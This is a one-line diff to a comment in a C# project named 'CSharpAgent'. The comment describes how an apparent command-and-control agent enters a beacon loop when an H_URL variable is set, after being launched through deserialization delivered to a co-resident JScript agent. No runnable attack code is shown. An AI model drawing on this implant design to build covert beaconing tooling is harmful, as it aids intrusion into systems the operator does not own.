@@ -12,7 +12,7 @@ namespace CSharpAgent
     // Dual-mode dispatch, decided by the process environment the host left us:
     //
     //   H_URL set → agent mode. Beacon.Run() parks THIS thread in the beacon loop and never
-    //               returns on its own — the deserialization that started us (a 0x0B Upgrade
+    //               returns on its own — the deserialization that started us (a 0x0B UpgradeNetFramework
     //               delivered to the JScript agent sharing this machine) never resumes its own
     //               loop, so exactly one agent beacons the shared MachineGuid session from here
     //               on. Run returns only on a fatal transport failure, unwinding back into the
